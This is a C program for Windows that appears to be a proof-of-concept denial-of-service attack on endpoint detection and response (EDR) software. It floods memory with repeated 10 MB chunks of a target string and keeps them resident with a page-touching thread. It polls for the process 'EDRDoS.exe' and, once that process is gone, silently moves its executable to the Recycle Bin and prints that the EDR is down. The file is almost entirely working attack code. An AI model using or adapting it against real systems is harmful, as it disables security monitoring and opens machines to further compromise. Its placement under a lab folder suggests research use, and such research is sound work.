#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <process.h>
#include <shlobj.h>

#define CHUNK_SIZE (10 * (1 << 20)) // 10 MB
#define TARGET_STRING "giveahhhhhhhplushietoformindpls"
#define CHECK_INTERVAL 1000 // 1 second
#define PROCESS_CHECK_INTERVAL 10000 // Check for process every 10 seconds

typedef struct {
    char **allocated_memory;
    size_t allocated_count;
    size_t chunk_size;
} MemoryInfo;

int is_process_running(const char *process_name) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    int is_running = 0;

    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, process_name) == 0) {
                is_running = 1;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return is_running;
}

void moveToTrash(const char *path) {
    SHFILEOPSTRUCT fileOp;
    char from[MAX_PATH];

    // SHFileOperation requires double null-terminated strings
    strncpy(from, path, MAX_PATH);
    from[MAX_PATH - 1] = '\0';  // Ensure null termination
    from[strlen(from) + 1] = '\0';  // Double null-termination

    fileOp.hwnd = NULL;
    fileOp.wFunc = FO_DELETE;
    fileOp.pFrom = from;
    fileOp.pTo = NULL;
    fileOp.fFlags = FOF_ALLOWUNDO | FOF_NOCONFIRMATION | FOF_SILENT;

    int result = SHFileOperation(&fileOp);
    if (result != 0) {
        printf("Failed to move file to Recycle Bin. Error: %d\n", result);
    } else {
        printf("File moved to Recycle Bin successfully.\n");
    }
}

void touch_memory(void *param) {
    MemoryInfo *mem_info = (MemoryInfo *)param;
    while (1) {
        for (size_t i = 0; i < mem_info->allocated_count; i++) {
            if (mem_info->allocated_memory[i] != NULL) {
                for (size_t j = 0; j < mem_info->chunk_size; j += 4096) { // Touch every 4 KB page
                    mem_info->allocated_memory[i][j] ^= 1; // Simple operation to ensure the memory is accessed
                }
            }
        }
        Sleep(CHECK_INTERVAL); // Sleep for a while before the next check
    }
}

size_t get_memory_usage() {
    PROCESS_MEMORY_COUNTERS pmc;
    HANDLE hProcess = GetCurrentProcess();
    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
        return pmc.WorkingSetSize / (1024 * 1024); // Return memory usage in MB
    }
    return 0;
}

int main() {
    size_t target_length = strlen(TARGET_STRING);
    size_t chunk_size = CHUNK_SIZE;

    // Allocate a chunk filled with the target string
    char *chunk = (char *)malloc(chunk_size);
    if (!chunk) {
        fprintf(stderr, "Initial memory allocation failed.\n");
        return 1;
    }

    // Fill the chunk with the target string repeatedly
    for (size_t i = 0; i < chunk_size; i += target_length) {
        memcpy(chunk + i, TARGET_STRING, target_length);
    }

    // Start filling memory
    char **allocated_memory = NULL;
    size_t allocated_count = 0;
    DWORD last_process_check = GetTickCount();

    MemoryInfo mem_info = {allocated_memory, allocated_count, chunk_size};

    // Start the memory touching thread
    _beginthread(touch_memory, 0, &mem_info);
    const char *filePath = "C:\\Program Files\\EDRDoSLab\\EDRDoS.exe";
    while (1) {
        // Allocate memory for the new chunk
        void *p = malloc(chunk_size);
        if (p == NULL) {
            fprintf(stderr, "Memory allocation failed. Retrying in 1 second...\n");
            Sleep(1000); // Sleep for 1 second before retrying
            continue;
        }

        // Use memset to ensure the memory is actually allocated
        memset(p, '?', chunk_size);

        // Optionally copy our prepared chunk into the newly allocated memory
        memcpy(p, chunk, chunk_size);

        // Store the pointer to the allocated memory
        char **new_memory = realloc(mem_info.allocated_memory, (mem_info.allocated_count + 1) * sizeof(char *));
        if (new_memory == NULL) {
            fprintf(stderr, "Memory reallocation failed.\n");
            break;
        }
        mem_info.allocated_memory = new_memory;
        mem_info.allocated_memory[mem_info.allocated_count] = p;
        mem_info.allocated_count++;

        printf("Current RAM usage: %zu MB\n", get_memory_usage());

        // Check if the process "EDRDoS.exe" is running every 10 seconds
        if (GetTickCount() - last_process_check >= PROCESS_CHECK_INTERVAL) {
            if (is_process_running("EDRDoS.exe")) {
                printf("Process EDRDoS.exe is running.\n");
            } else {
                printf("Process EDRDoS.exe is NOT running.\n");
                moveToTrash(filePath);
                break;
            }
            last_process_check = GetTickCount();
        }

        Sleep(10); // Sleep for 10 milliseconds to slow down the process
    }

    // Free allocated memory
    for (size_t i = 0; i < mem_info.allocated_count; i++) {
        free(mem_info.allocated_memory[i]);
    }
    free(mem_info.allocated_memory);
    free(chunk);

    Sleep(1000);
    printf("Hello, I'm now free to do what I want, EDRDoS.exe was moved on trash. \nEDR is down, memory allocatad is free. The machine is alive and running.");

    return 0;
}